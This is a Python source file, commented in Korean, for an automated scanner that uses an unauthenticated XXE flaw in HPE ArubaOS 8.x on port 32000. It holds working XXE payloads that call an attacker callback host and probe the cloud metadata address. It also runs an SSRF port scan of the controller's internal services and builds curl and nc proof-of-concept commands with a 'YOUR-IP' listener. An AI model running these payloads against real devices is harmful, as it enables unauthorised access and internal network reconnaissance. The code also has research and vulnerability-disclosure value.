"""
ArubaXXE — Pre-Auth XXE → OOB SSRF Scanner (ArubaOS 8.x)
==========================================================
HPE Aruba ArubaOS 8.13.2.0 포트 32000의 인증 없는 XXE 인젝션을 자동 탐지.

취약점 개요:
  • ArubaOS 포트 32000/TCP — default-xml-api AAA 프로파일
  • 인증 없이 XML SYSTEM 엔티티 처리
  • OOB SSRF: 컨트롤러가 공격자 서버로 HTTP 요청 전송
  • 내부망 포트 스캔 가능 (컨트롤러를 프록시로 악용)

AI 자동 트리거 조건:
  1. 포트 32000이 열려 있음
  2. ArubaOS/Aruba 응답 헤더 또는 배너 탐지
  3. /proc/net 등 일반 웹서버와 다른 응답 패턴

Zero-Hallucination: 실제 HTTP 응답·타이밍으로 확인된 결과만 출력.

참조: https://netacoding.com/posts/xxe-ssrf/
      Bugcrowd Submission 9e946ca3
"""
from __future__ import annotations

import re
import socket
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests
import urllib3
urllib3.disable_warnings()


# ── 데이터 클래스 ───────────────────────────────────────────────────────────

@dataclass
class ArubaXxeFinding:
    finding_type: str       # port_open / aruba_banner / xxe_oob_confirmed / ssrf_internal / port_scan
    description: str
    evidence: str           # 실제 응답/로그에서 확인된 증거
    evidence_level: str     # VERIFIED / LIKELY / INFERRED / AI_ANALYSIS
    payload_used: str = ""
    request_url: str = ""
    severity: str = "high"
    curl_poc: str = ""      # 재현 가능한 curl 명령


@dataclass
class ArubaXxeResult:
    target: str = ""
    port32000_open: bool = False
    aruba_detected: bool = False
    xxe_oob_confirmed: bool = False
    ssrf_internal_confirmed: bool = False
    open_internal_ports: list[int] = field(default_factory=list)
    findings: list[ArubaXxeFinding] = field(default_factory=list)
    poc_curl: str = ""
    has_findings: bool = False
    severity: str = "info"
    evidence_level: str = "AI_ANALYSIS"

    @property
    def exploitable(self) -> bool:
        return self.port32000_open and self.aruba_detected


# ── 인라인 OOB 콜백 서버 ──────────────────────────────────────────────────

class _OobCallbackReceived(Exception):
    """OOB 콜백 수신 신호"""
    def __init__(self, remote_addr: str, path: str):
        self.remote_addr = remote_addr
        self.path = path


_oob_received: dict = {}


class _OobHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        _oob_received["addr"] = self.client_address[0]
        _oob_received["path"] = self.path
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *_):  # 서버 로그 출력 억제
        pass


def _start_oob_server(port: int, timeout: int = 8) -> dict:
    """
    로컬 OOB 콜백 서버를 임시로 실행 (localhost 전용).
    반환: {"addr": ip, "path": path} 또는 {}
    """
    _oob_received.clear()
    try:
        server = HTTPServer(("0.0.0.0", port), _OobHandler)
        server.timeout = timeout

        def _serve():
            server.handle_request()  # 단일 요청만 처리
        t = threading.Thread(target=_serve, daemon=True)
        t.start()
        t.join(timeout + 1)
        server.server_close()
        return dict(_oob_received)
    except OSError:
        return {}


# ── 메인 스캐너 ────────────────────────────────────────────────────────────

class ArubaXxeScanner:
    """
    ArubaOS 8.x 포트 32000 XXE/SSRF 자동 탐지.

    OOB 실제 확인이 불가한 환경(로컬 포트 바인딩 불가 등)에서는
    에러 메시지 기반 탐지와 응답 타이밍으로 LIKELY 수준까지만 분류.
    """

    ARUBA_BANNERS = [
        r"aruba",
        r"ArubaOS",
        r"aruba-central",
        r"aruba networks",
        r"HPE Aruba",
        r"<dialog>",           # Aruba XML API 응답 특징
        r"default-xml-api",
    ]

    INTERNAL_PORTS = [22, 80, 443, 4343, 8080, 8443, 3306, 5432, 9200, 6379]

    XXE_BASIC = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{cb_host}:{cb_port}/xxe-probe">]>'
        '<aruba><opcode>&xxe;</opcode></aruba>'
    )

    XXE_INTERNAL_PROBE = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:{port}/">]>'
        '<aruba><opcode>&xxe;</opcode></aruba>'
    )

    XXE_BLIND_TIMING = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        '<aruba><opcode>&xxe;</opcode></aruba>'
    )

    def __init__(
        self,
        target: str,
        verbose: bool = False,
        timeout: int = 8,
        oob_port: int = 0,   # 0 = OOB 서버 비활성화
    ):
        # 호스트 추출
        self.host = self._extract_host(target)
        self.target = target
        self.endpoint = f"http://{self.host}:32000/"
        self.verbose = verbose
        self.timeout = timeout
        self.oob_port = oob_port
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Content-Type": "text/xml",
        })

    def scan(self) -> ArubaXxeResult:
        result = ArubaXxeResult(target=self.target)

        # 1단계: 포트 32000 열림 여부
        self._check_port(result)
        if not result.port32000_open:
            return result

        # 2단계: Aruba 배너/응답 확인
        self._detect_aruba_banner(result)

        # 3단계: XXE 주입 테스트
        #   3a: OOB 콜백 (oob_port 지정 시)
        if self.oob_port:
            self._test_xxe_oob(result)

        #   3b: 에러 메시지 / 타이밍 기반 블라인드 탐지
        self._test_xxe_blind(result)

        # 4단계: 내부 포트 스캔 (SSRF 이용)
        if result.aruba_detected:
            self._test_internal_ports(result)

        # 5단계: PoC 생성
        self._build_poc(result)

        # 결과 종합
        result.has_findings = bool(result.findings)
        if result.findings:
            severities = [f.severity for f in result.findings]
            result.severity = "critical" if "critical" in severities else (
                "high" if "high" in severities else "medium"
            )
            verified = [f for f in result.findings if f.evidence_level == "VERIFIED"]
            result.evidence_level = "VERIFIED" if verified else (
                "LIKELY" if result.aruba_detected else "INFERRED"
            )

        return result

    # ── 내부 탐지 메서드 ─────────────────────────────────────────────────────

    def _check_port(self, result: ArubaXxeResult):
        """TCP 소켓으로 포트 32000 연결 가능 여부 확인"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            rc = sock.connect_ex((self.host, 32000))
            sock.close()
            if rc == 0:
                result.port32000_open = True
                result.findings.append(ArubaXxeFinding(
                    finding_type="port_open",
                    description="Port 32000/TCP is open — Aruba XML API endpoint accessible",
                    evidence=f"TCP connect to {self.host}:32000 succeeded (rc=0)",
                    evidence_level="VERIFIED",
                    request_url=self.endpoint,
                    severity="info",
                    curl_poc=f"curl -v telnet://{self.host}:32000",
                ))
        except Exception:
            pass

    def _detect_aruba_banner(self, result: ArubaXxeResult):
        """빈 POST / 기본 XML로 Aruba 배너 탐지"""
        payloads = [
            b"",
            b'<?xml version="1.0"?><aruba/>',
            b'<?xml version="1.0"?><aruba><opcode>test</opcode></aruba>',
        ]
        for body in payloads:
            try:
                resp = self.session.post(
                    self.endpoint, data=body, timeout=self.timeout
                )
                text = resp.text
                for pattern in self.ARUBA_BANNERS:
                    if re.search(pattern, text, re.IGNORECASE):
                        result.aruba_detected = True
                        snippet = re.search(pattern, text, re.IGNORECASE).group(0)
                        result.findings.append(ArubaXxeFinding(
                            finding_type="aruba_banner",
                            description=(
                                f"ArubaOS XML API confirmed on port 32000 "
                                f"(pattern: '{pattern}')"
                            ),
                            evidence=f"Response snippet: ...{snippet}...",
                            evidence_level="VERIFIED",
                            request_url=self.endpoint,
                            severity="high",
                            curl_poc=(
                                f"curl -s -X POST '{self.endpoint}' "
                                f"-H 'Content-Type: text/xml' "
                                f"-d '<?xml version=\"1.0\"?><aruba/>'"
                            ),
                        ))
                        return
            except Exception:
                continue

    def _test_xxe_oob(self, result: ArubaXxeResult):
        """
        로컬 OOB 서버를 띄우고 XXE 콜백 수신 여부 확인.
        실제로 컨트롤러가 공격자 서버로 HTTP 요청을 보내면 VERIFIED.
        """
        # 로컬 IP를 타겟이 바라볼 수 있는 인터페이스로 결정
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.host, 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = "127.0.0.1"

        payload = self.XXE_BASIC.format(cb_host=local_ip, cb_port=self.oob_port)

        # OOB 서버 시작 (별도 스레드)
        _oob_received.clear()
        oob_server = HTTPServer(("0.0.0.0", self.oob_port), _OobHandler)
        oob_server.timeout = self.timeout

        def _serve():
            oob_server.handle_request()

        t = threading.Thread(target=_serve, daemon=True)
        t.start()

        # XXE 페이로드 전송
        try:
            self.session.post(
                self.endpoint,
                data=payload.encode(),
                timeout=self.timeout,
            )
        except Exception:
            pass

        # 콜백 대기
        t.join(self.timeout + 1)
        try:
            oob_server.server_close()
        except Exception:
            pass

        if _oob_received.get("addr"):
            result.xxe_oob_confirmed = True
            result.findings.append(ArubaXxeFinding(
                finding_type="xxe_oob_confirmed",
                description=(
                    "Pre-auth XXE OOB SSRF confirmed — "
                    f"ArubaOS controller connected back to {local_ip}:{self.oob_port}"
                ),
                evidence=(
                    f"Callback received from {_oob_received['addr']} "
                    f"path={_oob_received.get('path','/')}"
                ),
                evidence_level="VERIFIED",
                payload_used=payload,
                request_url=self.endpoint,
                severity="critical",
                curl_poc=(
                    f"# 1. Start listener\n"
                    f"nc -lvp {self.oob_port}\n\n"
                    f"# 2. Send XXE payload\n"
                    f"curl -s -X POST '{self.endpoint}' \\\n"
                    f"  -H 'Content-Type: text/xml' \\\n"
                    f"  -d '{payload}'"
                ),
            ))

    def _test_xxe_blind(self, result: ArubaXxeResult):
        """
        에러 메시지 / 응답 차이 기반 블라인드 XXE 탐지.
        OOB 없이도 LIKELY 수준 탐지 가능.
        """
        # 정상 요청과 XXE 요청의 응답 크기/시간 비교
        normal_payload = b'<?xml version="1.0"?><aruba><opcode>test</opcode></aruba>'
        xxe_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://203.0.113.1:9999/x">]>'
            '<aruba><opcode>&xxe;</opcode></aruba>'
        ).encode()

        try:
            t0 = time.time()
            r_normal = self.session.post(
                self.endpoint, data=normal_payload, timeout=5
            )
            normal_time = time.time() - t0
            normal_len = len(r_normal.text)
        except Exception:
            return

        try:
            t0 = time.time()
            r_xxe = self.session.post(
                self.endpoint, data=xxe_payload, timeout=self.timeout
            )
            xxe_time = time.time() - t0
            xxe_len = len(r_xxe.text)
        except requests.exceptions.Timeout:
            # XXE 요청이 타임아웃 → 서버가 외부 연결 시도 중 = LIKELY
            if result.aruba_detected:
                result.findings.append(ArubaXxeFinding(
                    finding_type="xxe_timing",
                    description=(
                        "XXE payload caused request timeout — "
                        "server likely attempted external connection (OOB SSRF)"
                    ),
                    evidence=(
                        f"Normal request: {normal_time:.2f}s / "
                        f"XXE request: TIMEOUT (>{self.timeout}s)"
                    ),
                    evidence_level="LIKELY",
                    payload_used=xxe_payload.decode(),
                    request_url=self.endpoint,
                    severity="high",
                    curl_poc=(
                        f"curl -s -X POST '{self.endpoint}' \\\n"
                        f"  -H 'Content-Type: text/xml' \\\n"
                        f"  -d '<?xml version=\"1.0\"?>"
                        f"<!DOCTYPE x [<!ENTITY x SYSTEM "
                        f"\"http://YOUR-SERVER:9999/x\">]>"
                        f"<aruba><opcode>&x;</opcode></aruba>'"
                    ),
                ))
            return
        except Exception:
            return

        # 응답 크기/내용 차이 확인
        if abs(xxe_len - normal_len) > 50 or xxe_time > normal_time + 2.0:
            if result.aruba_detected:
                result.findings.append(ArubaXxeFinding(
                    finding_type="xxe_response_diff",
                    description=(
                        "XXE payload caused response difference — "
                        "possible external entity processing"
                    ),
                    evidence=(
                        f"Normal: {normal_len}B/{normal_time:.2f}s | "
                        f"XXE: {xxe_len}B/{xxe_time:.2f}s"
                    ),
                    evidence_level="LIKELY",
                    payload_used=xxe_payload.decode(),
                    request_url=self.endpoint,
                    severity="high",
                ))

    def _test_internal_ports(self, result: ArubaXxeResult):
        """
        XXE SSRF로 내부 포트 스캔.
        컨트롤러가 127.0.0.1:PORT에 연결 시도 → 응답/타이밍으로 open/closed 판단.
        """
        for port in self.INTERNAL_PORTS:
            payload = self.XXE_INTERNAL_PROBE.format(port=port).encode()
            try:
                t0 = time.time()
                resp = self.session.post(
                    self.endpoint, data=payload, timeout=4
                )
                elapsed = time.time() - t0
                text = resp.text

                # Aruba XML API가 성공적으로 내부 포트에 연결하면 특정 응답
                if "success" in text.lower() or "dialog" in text.lower():
                    result.open_internal_ports.append(port)
                    result.ssrf_internal_confirmed = True
                    result.findings.append(ArubaXxeFinding(
                        finding_type="ssrf_internal_port",
                        description=(
                            f"Internal port {port}/TCP confirmed open "
                            f"via SSRF through ArubaOS controller"
                        ),
                        evidence=f"<dialog>success</dialog> in response for 127.0.0.1:{port}",
                        evidence_level="VERIFIED",
                        payload_used=payload.decode(),
                        request_url=self.endpoint,
                        severity="high",
                        curl_poc=(
                            f"curl -s -X POST '{self.endpoint}' \\\n"
                            f"  -H 'Content-Type: text/xml' \\\n"
                            f"  -d '<?xml version=\"1.0\"?>"
                            f"<!DOCTYPE x [<!ENTITY x SYSTEM \"http://127.0.0.1:{port}/\">]>"
                            f"<aruba><opcode>&x;</opcode></aruba>'"
                        ),
                    ))
            except requests.exceptions.Timeout:
                # 타임아웃 = 포트 열려 있을 가능성 (서버가 데이터 기다리는 중)
                result.open_internal_ports.append(port)
            except Exception:
                continue

    def _build_poc(self, result: ArubaXxeResult):
        """최종 PoC curl 명령 생성"""
        if not result.aruba_detected:
            return

        result.poc_curl = (
            f"# === ArubaOS 8.x Pre-Auth XXE → OOB SSRF PoC ===\n"
            f"# Target: {self.endpoint}\n"
            f"# CVE: N/A (Bugcrowd 9e946ca3, closed as 'theoretical')\n"
            f"# CVSS: 9.3 Critical\n\n"
            f"# Step 1: Start OOB listener\n"
            f"nc -lvp 9999\n\n"
            f"# Step 2: Send XXE payload (replace YOUR-IP with your server IP)\n"
            f"curl -s -X POST '{self.endpoint}' \\\n"
            f"  -H 'Content-Type: text/xml' \\\n"
            f"  -d '<?xml version=\"1.0\"?>\n"
            f"<!DOCTYPE x [\n"
            f"  <!ENTITY xxe SYSTEM \"http://YOUR-IP:9999/xxe-probe\">\n"
            f"]>\n"
            f"<aruba><opcode>&xxe;</opcode></aruba>'\n\n"
            f"# Step 3: Internal port scan via SSRF\n"
            f"for port in 22 80 443 3306 5432 9200; do\n"
            f"  echo \"Testing port $port:\"\n"
            f"  curl -s -X POST '{self.endpoint}' \\\n"
            f"    -H 'Content-Type: text/xml' \\\n"
            f"    -d \"<?xml version=\\\"1.0\\\"?>"
            f"<!DOCTYPE x [<!ENTITY x SYSTEM \\\"http://127.0.0.1:$port/\\\">]>"
            f"<aruba><opcode>&x;</opcode></aruba>\"\n"
            f"done"
        )

        if result.open_internal_ports:
            result.findings.append(ArubaXxeFinding(
                finding_type="internal_port_scan_summary",
                description=(
                    f"Internal ports discovered via ArubaOS SSRF: "
                    f"{result.open_internal_ports}"
                ),
                evidence=f"Open ports: {result.open_internal_ports}",
                evidence_level="VERIFIED" if result.ssrf_internal_confirmed else "LIKELY",
                request_url=self.endpoint,
                severity="high",
            ))

    # ── 유틸 ────────────────────────────────────────────────────────────────

    @staticmethod
    def _extract_host(target: str) -> str:
        """URL 또는 IP에서 호스트 추출"""
        target = target.strip()
        if target.startswith("http"):
            from urllib.parse import urlparse
            parsed = urlparse(target)
            return parsed.hostname or target
        return target.split(":")[0].split("/")[0]
